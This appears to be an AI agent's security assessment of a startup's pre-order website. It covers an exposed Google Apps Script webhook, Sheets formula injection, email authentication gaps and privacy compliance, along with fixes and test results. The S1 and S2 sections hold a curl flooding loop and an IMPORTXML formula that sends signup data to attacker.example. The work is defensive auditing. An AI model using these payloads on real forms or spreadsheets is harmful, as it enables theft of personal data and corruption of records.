# Zuca — Security & Privacy Assessment

**Scope:** `github.com/Zuca-Snacks/zuca-site` @ branch `sec/hardening`, cut from `main` (commit `4074263`).
**Assessed:** 2026-08-15 · **Assessor:** Agent 3 (appsec / privacy engineering)
**Status:** diagnosis complete; remediation in progress on this branch. Nothing merged to `main`.

---

## 1. What this system actually is

Before the threat list, the architecture — because it is not what the brief assumed.

There is **no backend in this repository.** No `src/app/api/**`, no `server/**`, no `middleware.ts`,
no environment variables, no hosting config. The entire site is a single React component
([src/zuca-gate-v4.jsx](src/zuca-gate-v4.jsx), 1457 lines) compiled by Vite into a static bundle.

The "backend" is a **Google Apps Script web app** whose URL is hardcoded at
[src/zuca-gate-v4.jsx:5](src/zuca-gate-v4.jsx#L5) and called directly from the visitor's browser:

```
https://script.google.com/macros/s/AKfycbz…TFh/exec
```

That URL is simultaneously:

- the write endpoint (`POST` → appends a row to a Google Sheet),
- the read endpoint (`GET` → returns `{"count":136}`, the number rendered on the page),
- **the only credential protecting both**, and
- **published** — it is in the client JS bundle *and* in a **public GitHub repository**
  (`"visibility": "public"`, confirmed via the GitHub API).

A URL that grants write access and is required to be public cannot be a secret. This single
fact drives findings S1, S2 and S3.

## 2. Data flow

| Stage | Where | Who can read it |
|---|---|---|
| Collected | Pre-order modal, [src/zuca-gate-v4.jsx:1076-1151](src/zuca-gate-v4.jsx#L1076-L1151) | the visitor |
| In transit | `fetch(SHEETS_URL, {mode:"no-cors"})` over TLS to Google | Google |
| At rest (primary) | A Google Sheet in a Google Workspace account | anyone with the sheet share link + every Workspace admin |
| At rest (secondary) | **The visitor's own `localStorage`**, key `zuca_submissions_v1` — full record incl. name, email, phone, retained forever | the visitor, and any XSS on the origin |
| Egress | None to analytics (there is no analytics on the site at all — verified) | — |

**Fields actually collected** — `name`, `email`, `phone`, `hearAbout`, `reason`, `ts`.

Two of these matter disproportionately:

- **`phone`** is not in the frozen data contract in `AGENTS_BRIEF.md` at all, and is the most
  sensitive identifier on the form. If it is ever used to send SMS, TCPA applies and the current
  form captures no consent whatsoever.
- **`reason`** — options include *Gut health* and *Weight management* — is health-adjacent
  personal data. The brief requires it be stored "only with explicit, separate opt-in."
  **There is no consent checkbox anywhere on the form.**

**Encryption at rest:** Google encrypts Drive/Sheets at rest by default (AES-256). Adequate.
**Console access:** unknown to me — see the owner-action list, item 6.

## 3. Ranked findings

Severity = impact × likelihood in *this* context (pre-launch consumer site, cold campaign imminent).
Exploitability = skill and access required. "Proof" = how I verified it, without touching production data.

| # | Severity | Finding | Exploitability | Blast radius | Status |
|---|---|---|---|---|---|
| **S1** | **Critical** | Public write endpoint with zero rate limiting, zero bot defense, zero auth | Trivial — one `curl` loop, no account, no skill | Pre-order list permanently poisoned; public traction counter falsifiable; sending domain blocklisted mid-campaign | Fixed on branch (see §4) |
| **S2** | **Critical** | Google Sheets **formula injection** via `name` / `hearAbout` / `reason` | Trivial — type a payload into "First name" | **Full exfiltration of every signup** (name, email, phone) to an attacker server when Emil opens the sheet | Fixed on branch + owner action |
| **S3** | **High** | Write-capable webhook URL published in client bundle **and public GitHub repo** | Trivial — view-source, or read the repo | Same as S1; not fixable by secrecy — needs architecture change + URL rotation | Fixed on branch + owner action |
| **S4** | **High** | **No DMARC record. No DKIM record.** SPF is `~all` (softfail) | Trivial — anyone can spoof `@zucasnacks.com` | Cold campaign lands in spam; Zuca becomes a phishing vehicle against its own physician network | Owner action (DNS) |
| **S5** | **High** | No privacy policy, no terms, **no consent capture**, no deletion path — while collecting health-adjacent data | N/A — compliance, not exploit | CCPA/CPRA exposure; CAN-SPAM exposure on the outbound campaign (statutory max **$53,088 per email**) | Fixed on branch + owner action |
| **S6** | **High** | **Forbidden health claims are live on the site**, including in `<title>` and OG/Twitter meta | N/A — regulatory | FDA/FTC exposure on a food product; directly contradicts the brief's non-negotiable guardrails | **Not mine to fix** → `HANDOFF-sec.md` |
| **S7** | **Medium** | `mode:"no-cors"` ⇒ opaque response ⇒ **every submission reports success even when it fails** | N/A — reliability | Silent, unrecoverable loss of real signups; makes the contract's 409/429/500 responses impossible to implement | Fixed on branch |
| **S8** | **Medium** | Duplicate detection is `localStorage`-only; also persists the user's full PII in their browser indefinitely | Trivial — incognito window | Duplicate rows inflate the counter; unnecessary PII at rest on user devices | Fixed on branch |
| **S9** | **Medium** | **No security headers at all** — no CSP, HSTS, `nosniff`, `Referrer-Policy`, `Permissions-Policy`, `frame-ancestors` | Low — clickjacking needs a lure | Pre-order modal can be framed and overlaid; no XSS containment | Fixed on branch |
| **S10** | **Medium** | Google Fonts loaded from CDN at runtime (`@import` at [src/zuca-gate-v4.jsx:111](src/zuca-gate-v4.jsx#L111)) | N/A — privacy | Every visitor's IP + User-Agent disclosed to Google, undisclosed in any policy; brief explicitly forbids this; also render-blocking | Flagged → `HANDOFF-sec.md` |
| **S11** | **Low** | 9 npm advisories (7 high) — `vite`, `postcss`, `@babel/core`, `launch-editor` | Local only | **All are devDependencies**; none reach the production bundle. But three dev servers are running on Emil's laptop right now, and one advisory is dev-server arbitrary file read | Fixed on branch |
| **S12** | **Low** | No CAA record on `zucasnacks.com` | Low | Any CA in the world may issue a certificate for the domain | Owner action (DNS) |

### Findings that are *not* problems (checked, clean)

- **No API keys, tokens, database URLs, private keys, or `.env` files** in the working tree or in
  any of the 20 commits of git history. I scanned every blob ever committed against AWS / Stripe /
  Slack / GitHub / Google API / SendGrid / Resend / JWT / connection-string / PEM patterns. Clean.
- **`.gitignore` already covers** `.env`, `.env.local`, `.env.*.local`.
- **No `VITE_`-prefixed or `import.meta.env` variables exist** — so nothing is leaking through the
  Vite public-env mechanism. The project uses no environment variables at all today.
- **The read path does not leak the list.** I issued one unauthenticated `GET` to the live webhook;
  it returns exactly `{"count":136}` and nothing else. There is no `?all=1`-style enumeration.
- **No analytics, no tag manager, no tracking pixel, no third-party script tags.** The only
  third-party network request the site makes is Google Fonts (S10). No PII leaves for analytics.
- **No `dangerouslySetInnerHTML`, no `eval`, no `innerHTML`** anywhere — the React tree escapes all
  user input, so there is no reflected/stored XSS in the site itself.

## 4. The three findings that matter most, in detail

Each is stated as **threat → exploit → fix → proof**, per the engagement rules.

### S1 — Anyone can write unlimited rows to the pre-order list

**Threat.** The endpoint that appends to the signup sheet is public, unauthenticated, unmetered and
unprotected by any bot check. There is no honeypot, no timing gate, no CAPTCHA, no rate limit — not
weak versions of these, but none at all.

**Exploit.** No skill required. The URL is in the page source:

```bash
for i in $(seq 1 10000); do
  curl -s -X POST "$SHEETS_URL" -H 'Content-Type: text/plain' \
    -d "{\"name\":\"bot$i\",\"email\":\"bot$i@mailinator.com\",\"ts\":\"$(date -Iseconds)\"}" &
done
```

**Blast radius — why this is Critical and not Medium.** Three compounding consequences:

1. **The list becomes unusable.** Once 10,000 junk rows sit alongside 136 real pre-orders, there is
   no reliable way to separate them. The asset is not damaged, it is destroyed.
2. **The traction number becomes a liability.** The site renders the live sheet count to visitors
   ("Join *N* others on the list"). That same number is the one quoted to investors. An attacker —
   or a bored competitor — controls it. A falsified traction figure shown to investors is a worse
   problem than a security incident.
3. **The campaign dies on arrival.** Feed a list padded with spamtraps and mailinator addresses into
   an ESP and `zucasnacks.com` gets blocklisted — precisely when the cold campaign launches, and
   precisely into the physician network that is Zuca's most valuable audience.

**Fix (this branch).** A real server-side endpoint at `POST /api/waitlist` (Vercel function) that
enforces: strict Zod validation with unknown keys rejected · POST-only · JSON-only · 8 KB body cap ·
honeypot · sub-2s submit rejection · per-IP limits (5/min, 20/hr) · a global endpoint ceiling ·
disposable/role-address filtering · `409` on duplicate. The Apps Script webhook stops being
browser-reachable and becomes a server-to-server call authenticated with a shared secret.

**Proof.** `scripts/attack-waitlist.mjs` — see §6.

### S2 — Formula injection exfiltrates the entire signup list

**Threat.** Submitted strings are written into Google Sheets cells verbatim. Google Sheets evaluates
any cell beginning `=`, `+`, `-`, or `@` as a formula. Sheets formulas can make outbound network
requests.

The code already knows this. [src/zuca-gate-v4.jsx:988](src/zuca-gate-v4.jsx#L988) prefixes phone
numbers with an apostrophe and comments *"Leading apostrophe forces Google Sheets to store as text,
not formula."* That guard was applied to the one field that cannot contain letters — and to none of
the three free-text fields that can.

**Exploit.** Type this into the **First name** box on the live site and submit:

```
=IMPORTXML(CONCAT("https://attacker.example/?d=",JOIN(",",A1:E500)),"//a")
```

No further attacker action. The next time Emil opens the sheet, Google's servers evaluate the
formula and issue a request carrying **the contents of 500 rows — every name, email and phone
number collected** — to the attacker's log. Variants using `IMAGE()` or `HYPERLINK()` work the same
way. The exfiltration comes from Google's IP range, leaves no trace in the sheet beyond one odd-
looking cell, and needs no compromise of any account.

**Blast radius.** This is the list-leak scenario from the engagement brief (threat #3), and it is
live right now. 136 real pre-orders, with phone numbers, plus health-adjacent `reason` values.

**Fix (this branch).** Two layers. Server-side, `sanitizeForSheet()` in
[src/lib/validation.js](src/lib/validation.js) neutralizes leading formula characters on every
string before it is forwarded. Sheet-side, the hardened Apps Script in
[server/apps-script/Code.gs](server/apps-script/Code.gs) re-applies the same guard and writes with
`setValues` on text-formatted columns — defence at both ends, because the Apps Script is the last
gate before the data lands.

**Proof.** §6, case 6.

### S3 — The write credential is published and cannot be un-published

**Threat.** The webhook URL is the only thing standing between the public and the sheet, and it must
be in the client bundle for the current architecture to work. It is additionally committed to a
public GitHub repo (commit `a0c52a8`, *"Add Sheets webhook"*).

**Exploit.** `view-source:`, or `git clone` the public repo. Then S1 and S2.

**Why rotation alone does not fix it.** Redeploying the Apps Script gives a new URL, which lands in
the next bundle, which is public again within one deploy. Secrecy is not available to a browser-
called endpoint. The architecture has to change: the browser must call *our* origin, and only our
server may hold the webhook URL.

**Fix (this branch).** The browser now calls same-origin `/api/waitlist`. The Apps Script URL moves
to `SHEETS_WEBHOOK_URL`, a server-only environment variable (deliberately **not** `VITE_`-prefixed —
that prefix is what makes a Vite variable public, and using it here would recreate the bug). The
Apps Script additionally requires a shared secret header, so even a leaked URL is not sufficient to
write.

**Proof.** `grep -r "script.google.com" dist/` after build returns nothing — §6, case 9.

## 5. Retention and deletion

Written to be executable, not aspirational.

**Retention.** Waitlist records are kept until the earlier of: (a) the subscriber requests deletion,
or (b) 24 months after the last interaction. Records for addresses that hard-bounce twice are
deleted within 30 days — this protects sender reputation as well as the subscriber.

**Deletion procedure** (target: complete within 45 days, CCPA's deadline):

1. Request arrives at `privacy@zucasnacks.com` (see owner-action 5 — this mailbox must exist).
2. Verify the requester controls the address: reply from the Zuca mailbox and require a reply. Do
   not require an account, ID document, or any information beyond what is already held — CPRA
   prohibits collecting new personal data to service a deletion request.
3. In the sheet: `Ctrl+F` the address → delete the entire row (not just the email cell).
4. In the ESP, once one exists: delete the contact, then add the address to the suppression list.
   Suppression retains a hash only — this is the one permitted retention after deletion, and it
   exists to *honor* the opt-out.
5. Log the request in a separate `dsr_log` sheet: date received, date completed, action. No email
   address in the log — record a SHA-256 prefix. CCPA requires you to be able to demonstrate
   compliance; it does not require you to keep the data you deleted.
6. Reply confirming completion.

**Access/know requests** follow the same path, returning the row contents.
**Opt-out of sale/sharing:** Zuca does not sell or share personal information. Say so, and keep it
true — if that ever changes, a "Do Not Sell or Share My Personal Information" link becomes mandatory.

**One honest gap:** deletion currently cannot reach data already copied into a visitor's own
`localStorage`. S8's fix removes that copy, which closes the gap prospectively; existing visitors'
copies expire when they clear their browser. This is disclosed in the privacy policy rather than
papered over.

## 6. Verification

Attack harness: `scripts/attack-waitlist.mjs`. Run against a local instance —
**never against production**, for the reason in the note below.

| # | Attack | Expected |
|---|---|---|
| 1 | Valid minimal payload (`email` + `consent_marketing`) | `200 {"ok":true}` |
| 2 | `GET` / `PUT` / `DELETE` on the endpoint | `405` |
| 3 | `Content-Type: text/plain` | `415` |
| 4 | 1 MB body | `413`, connection cut before parse |
| 5 | Unknown key `{"isAdmin":true}` | `400 validation` |
| 6 | `name` = `=IMPORTXML(...)` formula payload | stored as `'=IMPORTXML(...)`, inert |
| 7 | `\r\n` header-injection chars in every string field | `400 validation` |
| 8 | 100 requests in 10s from one IP | first 5 `200`, remainder `429` |
| 9 | Filled honeypot `hp_field` | `200 {"ok":true}` — accepted and silently discarded, so bots learn nothing |
| 10 | `form_render_ts` 500 ms ago | rejected as bot |
| 11 | `admin@`, `postmaster@`, `@mailinator.com` | `400 validation` |
| 12 | Same email twice | `200` then `409 duplicate` |
| 13 | `grep -r "script.google.com" dist/` after `npm run build` | no matches |
| 14 | Header scan against a preview deploy | CSP, HSTS, nosniff, Referrer-Policy, Permissions-Policy, frame-ancestors present |

Results are recorded in §7 once each fix lands.

> **A note on what I deliberately did not test.** The brief asks for 100 rapid requests and
> malformed payloads against the endpoint. Run against the *current* production webhook, that would
> write ~100 junk rows into the real 136-row pre-order sheet and visibly inflate the traction
> counter on the live site. I ran exactly one read-only `GET` against production — enough to confirm
> the endpoint is unauthenticated and returns only a count — and nothing else. The full attack suite
> runs against the hardened endpoint locally. If you want the current webhook's write path
> demonstrated against production, say so and I will send a single row tagged
> `sectest-delete-me@example.invalid` that you can delete in one click.

## 7. Results

### Endpoint attack suite — `npm run security:test`

**55 of 55 cases pass.** The harness boots the real handler behind a local HTTP server and attacks
it; it never touches production. Selected results:

```
✓ Valid minimal payload                       200 {"ok":true}
✓ Method GET / PUT / DELETE / PATCH           405
✓ Content-Type: text/plain                    415
✓ Content-Type: form-urlencoded               415        ← blocks cross-origin form CSRF
✓ 1 MB body                                   413
✓ Chunked 320 KB body, no Content-Length      413        ← stream counter, not the header
✓ Unknown key {"isAdmin":true}                400 validation
✓ Unknown key inside utm object               400 validation
✓ CRLF in email / page_path                   400 validation
✓ RTL override char in utm.campaign           400 validation
✓ consent_marketing missing / false / "true"  400 validation
✓ 4 motivations / invalid enum / 4-digit zip  400 validation
✓ admin@, postmaster@, @mailinator.com        400 validation
✓ Cross-origin POST (Origin: evil.example)    403
✓ Malformed JSON: garbage/array/string/null   400 validation
✓ 100 rapid requests from one IP              5×200, 95×429, 0 other
✓ 429 carries Retry-After                     Retry-After: 60
✓ 429 body leaks no internals                 {"ok":false,"error":"rate_limited"}
✓ Spoofed X-Forwarded-For                     still 429  ← last hop, not first
✓ Filled honeypot                             200 {"ok":true}, log: reject.bot honeypot
✓ Sub-2-second submission                     200 {"ok":true}, log: reject.bot too_fast
✓ Human-speed submission (9s)                 200 {"ok":true}, log: accepted
✓ 5 formula-injection payloads                all prefixed with ' → inert text
✓ Tab-escape formula payload                  neutralized
✓ Nested utm formula payload                  neutralized
✓ motivation without consent_health           dropped, stored as null
✓ Zero-width char in email                    normalized to the same address
✓ Full-width ＠ in email                       normalized via NFKC
✓ Error response echoes submitted input       no — canary string absent from body
```

Two findings came out of running it rather than writing it:

- The oversized-chunked case initially failed. The server was right — `curl` received a clean
  `413 {"ok":false,"error":"payload_too_large"}` — but the handler destroyed the socket before the
  response flushed, so a client that was still uploading saw a connection reset instead of a status.
  Fixed by responding, sending `Connection: close`, and only then tearing down. The test now drives
  a raw socket, because Node's `fetch` discards an early response that arrives mid-upload and was
  measuring the client rather than the server.
- The rate-limit test only proves what it claims because each case draws a fresh source IP.
  Without that, state bleeds between cases and later assertions pass for the wrong reason.

### Secrets

```
$ git log --all --diff-filter=A --name-only | grep -iE '\.env|secret|credential|key|token'
(none)
```
Every blob in all 20 commits scanned against AWS / Stripe / Slack / GitHub / Google API /
SendGrid / Resend / JWT / connection-string / PEM patterns — **no matches**. No `VITE_` or
`import.meta.env` usage exists, so nothing can leak via Vite's public-env mechanism.

### Client bundle

```
$ npm run build && node -e "…read dist/assets/*.js…"
bundle bytes:            238090
contains ZodError:       false     ← server-only validation stays server-side
contains UPSTASH:        false
contains SHEETS_WEBHOOK: false
```

**Still failing, and expected to:** `grep -r "script.google.com" dist/` matches. The client
component still calls the Apps Script directly, and that file belongs to another agent. **Until the
change in `HANDOFF-sec.md` §1 lands, S1 and S3 are only half fixed** — the hardened endpoint exists
but nothing is forced through it. This is the single most important open item on the branch.

### Supply chain

`npm audit`: **9 advisories (2 low, 7 high) → 0**, via `npm audit fix` with no `--force` and no
`package.json` range changes. All nine were devDependencies (`vite`, `postcss`, `@babel/core`,
`launch-editor`) and none reached the production bundle — but one was arbitrary file read via the
Vite dev server, and three dev servers are running on Emil's laptop right now.

No third-party script tags, no analytics, no tag manager, nothing loading remote code at runtime.
The only external subresource is Google Fonts (S10). `zod` is the one dependency added: server-only,
actively maintained, no install scripts. Dependabot config added at `.github/dependabot.yml`.

### Headers — baseline, before this branch

`npm run security:headers` against live `https://zucasnacks.com`:

```
✓ strict-transport-security      max-age=63072000
✗ x-content-type-options         (absent)
✗ content-security-policy        (absent)
✗ x-frame-options                (absent)
✗ referrer-policy                (absent)
✗ permissions-policy             (absent)
✗ content-security-policy-report-only (absent)
✗ access-control-allow-origin: * on static responses
✗ /api/waitlist                  404 — endpoint does not exist yet
8 checks failed.
```

Two things this measurement changed:

- Vercel already sends HSTS at `max-age=63072000`. My first draft of `vercel.json` set
  `31536000; includeSubDomains`, which would have **halved** the existing max-age. Corrected to
  `63072000`. `includeSubDomains` is deliberately still off — DNS is at WordPress.com, there may be
  a subdomain I cannot enumerate, and the setting sticks in browsers for two years. Owner action 10.
- `access-control-allow-origin: *` on static responses is Vercel's default. Harmless for public
  assets, and `Cross-Origin-Resource-Policy: same-origin` now constrains it. What matters is that
  the *write* endpoint never carries it — verified above, cross-origin POST returns `403` with no
  ACAO header at all.

Re-run `npm run security:headers` against the preview deploy after merge to confirm the configured
headers are actually emitted. A header declared in `vercel.json` and a header on the wire are
different claims.

## 8. What only you can do (outside the codebase)

Ranked by urgency. Items 1–4 are pre-campaign blockers.

1. **Publish DMARC.** No record exists today. Add a TXT record at `_dmarc.zucasnacks.com`:
   `v=DMARC1; p=none; rua=mailto:dmarc@zucasnacks.com; fo=1` — start at `p=none` to collect reports
   without risking legitimate mail, then move to `p=quarantine` after ~2 weeks of clean reports, and
   `p=reject` after a month. Do this *before* the campaign, not after.
2. **Enable DKIM in Google Workspace.** `google._domainkey.zucasnacks.com` is empty, which means
   Workspace DKIM was never switched on. Admin console → Apps → Google Workspace → Gmail →
   Authenticate email → Generate new record → publish the TXT → Start authentication. Without DKIM,
   DMARC cannot pass on forwarded mail.
3. **Rotate the Apps Script deployment.** The current URL is public and write-capable. In Apps
   Script: Deploy → Manage deployments → **archive the existing deployment** (this is what actually
   kills the old URL) → paste the hardened `Code.gs` → create a *new* deployment → put the new URL
   in Vercel as `SHEETS_WEBHOOK_URL` and the secret as `SHEETS_WEBHOOK_TOKEN`. I have not touched
   your credentials, per the engagement rules.
4. **Audit the existing 136 rows for formula-injection payloads** before opening the sheet on a
   machine you care about. Safest method: File → Download → CSV, then inspect the CSV in a plain
   text editor for cells starting with `=`, `+`, `-`, or `@`. Do not open it in Excel either.
5. **Create `privacy@zucasnacks.com`** — the privacy policy names it as the rights address and it
   must actually receive mail.
6. **Decide and record who has access to the sheet.** Check Share settings: it should be
   "Restricted", named individuals only, with **no** "anyone with the link" entry. Every person on
   that list can read every pre-order.
7. **Add a CAA record:** `zucasnacks.com. CAA 0 issue "letsencrypt.org"` and
   `0 issue "digicert.com"` (Vercel uses Let's Encrypt).
8. **Get counsel to review the legal pages.** I wrote `/privacy` and `/terms` to describe what the
   code actually does, which is the hard part and the part I can verify. They are not a substitute
   for review by a lawyer. **Cooley already advises Zuca — send them these two pages and the health-
   claim list in `HANDOFF-sec.md` together.** The health claims are the more urgent of the two.
